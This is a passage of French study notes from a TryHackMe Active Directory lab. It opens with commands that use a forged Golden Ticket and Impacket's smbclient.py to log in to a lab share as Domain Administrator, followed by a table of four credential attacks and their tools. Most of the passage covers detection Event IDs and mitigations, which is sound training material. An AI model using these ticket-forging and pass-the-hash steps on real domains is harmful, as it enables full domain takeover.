Ceci crée un fichier `Administrator.ccache` contenant le **TGT forgé**. L'exporter comme cache d'identifiants Kerberos :

```bash
root@tryhackme:$ export KRB5CCNAME=Administrator.ccache
```

**S'authentifier** au partage en tant que Domain Administrator via Kerberos :

```bash
root@tryhackme:$ smbclient.py thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Type help for list of commands
#
```

> 📌 Rappel : avec l'authentification Kerberos, toujours utiliser le **nom d'hôte** plutôt que l'adresse IP.

➡️ Se rendre sur le partage **SHARE6** et récupérer `flag6.txt`.

---

## 🎯 Comprendre l'impact

Ces quatre attaques démontrent à quel point la sécurité de l'authentification est **critique** dans les environnements AD. Mots de passe faibles, failles de conception des protocoles, et protection insuffisante des identifiants sensibles peuvent tous mener à une **compromission complète du domaine**.

Les rooms suivantes de ce module approfondiront chacune de ces attaques : techniques d'exploitation avancées, mais aussi — tout aussi important — les **moyens de défense** associés.

> 💡 **À retenir** : l'authentification ne consiste pas seulement à permettre aux utilisateurs de se connecter — il s'agit de garantir que **seuls les utilisateurs légitimes** peuvent accéder aux ressources, et que leurs identifiants ne peuvent pas être facilement compromis ou détournés.

---

## ✅ Récapitulatif des 4 attaques démontrées

| # | Attaque | Principe | Outil utilisé | Partage |
|---|---|---|---|---|
| 1 | **Weak Password Hashing** | Casser un hash NTLM faible pour obtenir le mot de passe en clair | `hashcat -m 1000` | SHARE3 |
| 2 | **Pass-the-Hash** | S'authentifier directement avec le hash NTLM, sans le casser | `smbclient.py -hashes` | SHARE4 |
| 3 | **Kerberoasting** | Extraire et casser le ticket de service d'un compte SPN | `GetUserSPNs.py` + `hashcat -m 13100` | SHARE5 |
| 4 | **Golden Ticket** | Forger un TGT à partir du hash KRBTGT pour usurper n'importe quel compte | `ticketer.py` | SHARE6 |



# Task 6 — Detections & Mitigations

Windows journalise un **événement de sécurité** pour chaque tentative d'authentification. Savoir quels **Event IDs** surveiller est ce qui fait la différence entre une attaque **détectée** et une attaque qui passe inaperçue.

Cette task fait le lien entre les **événements clés** et les attaques vues dans les tasks précédentes, et associe chacune à une **mitigation pratique**.

---

## 🆔 Event IDs Windows clés

| Event ID | Journal | Description |
|---|---|---|
| **4624** | Security | Connexion réussie — vérifier le *Authentication Package* et le *Logon Type*. |
| **4625** | Security | Connexion échouée — utile pour détecter le **password spraying**. |
| **4768** | Security | Demande de **TGT Kerberos**. |
| **4769** | Security | Demande de **ticket de service Kerberos** — événement clé pour la détection du **Kerberoasting**. |
| **4771** | Security | Échec de **pré-authentification Kerberos** — utile pour détecter l'**AS-REP Roasting** et le **brute-force**. |

---

## 🔍 Détecter les attaques basées sur NTLM

L'**Event ID 4624** est journalisé sur le serveur cible pour **chaque connexion réussie**. Lorsque NTLM est utilisé, plusieurs champs se distinguent :

| Champ | Valeur observée | Signification |
|---|---|---|
| **Authentication Package** | `NTLM` | Les connexions Kerberos affichent `Kerberos` dans ce même champ. |
| **Logon Type** | `3` | Indique une **connexion réseau** — typique d'un **Pass-the-Hash** via WinRM ou SMB. |
| **Source Network Address** | *(vide)* | Lorsque le DC valide une connexion NTLM, l'événement 4624 résultant est souvent **dépourvu d'adresse IP source**, rendant l'attribution plus difficile. Les événements Kerberos équivalents (**4768/4769**) renseignent, eux, correctement le champ adresse client. |

> 🚨 **Indicateur fort** : une connexion réseau utilisant **NTLM** contre une cible à forte valeur comme un **contrôleur de domaine** est un signal fort d'une tentative de **Pass-the-Hash**.

---

## 🔍 Détecter le Kerberoasting

L'**Event ID 4769** est généré à chaque demande de ticket de service. Le **Kerberoasting** produit un **pic d'événements 4769** sur une courte fenêtre de temps, ciblant souvent **plusieurs comptes de service**.

### Deux éléments à surveiller :

1. **Volume élevé d'événements 4769** provenant d'un **même compte** sur une courte période.
2. **Type de chiffrement du ticket (Ticket Encryption Type)** :
   - `0x17` (**RC4-HMAC**) — alors que les environnements modernes délivrent par défaut des tickets **AES-256** (`0x12`).
   - ➡️ Une demande de ticket en **RC4** provenant d'un compte qui supporte l'AES peut indiquer un **downgrade délibéré**, destiné à accélérer le cassage hors ligne.

### AS-REP Roasting & Brute-force

L'**Event ID 4771** (échec de pré-authentification Kerberos) mérite également d'être surveillé. Un **pic d'événements 4771** répartis sur **de nombreux comptes** en peu de temps peut indiquer :

- un **AS-REP Roasting** — l'attaquant teste quels comptes ont la **pré-authentification désactivée** ;
- ou une tentative de **brute-force** contre les comptes du domaine.

---

## 🛡️ Mitigations

| Attaque | Mitigation |
|---|---|
| **Pass-the-Hash** | Ajouter les comptes privilégiés au groupe **Protected Users** ; désactiver NTLM lorsque Kerberos est disponible. |
| **NTLM Relay** | Appliquer la **signature SMB (SMB signing)** ; activer **Extended Protection for Authentication (EPA)** sur LDAP et AD CS. |
| **Kerberoasting** | Utiliser des mots de passe **forts et aléatoires** pour les comptes de service, ou migrer vers des **Group Managed Service Accounts (gMSA)**. |
| **Golden Ticket** | Protéger le compte **KRBTGT** ; réinitialiser son mot de passe **deux fois** après toute compromission suspectée. |
| **Password Spray** | Configurer des **politiques de verrouillage de compte** ; surveiller l'**Event ID 4625** pour détecter des échecs répétés sur plusieurs comptes. |

---

## ✅ À retenir

- **4624** = connexion réussie → vérifier *Authentication Package* (NTLM vs Kerberos) et *Logon Type*.
- **4625** = connexion échouée → indicateur de **password spraying**.
- **4768/4769** = demandes Kerberos (TGT / Service Ticket) → **4769** est central pour détecter le **Kerberoasting** (volume + type de chiffrement RC4 vs AES).
- **4771** = échec de pré-authentification → indicateur d'**AS-REP Roasting** ou de **brute-force**.
- Une connexion NTLM (Logon Type 3, sans IP source) vers un **DC** = signal fort de **Pass-the-Hash**.
- Chaque attaque de la Task 5 possède une **mitigation dédiée** : Protected Users / désactivation NTLM, SMB signing / EPA, gMSA, protection du KRBTGT, politiques de verrouillage.
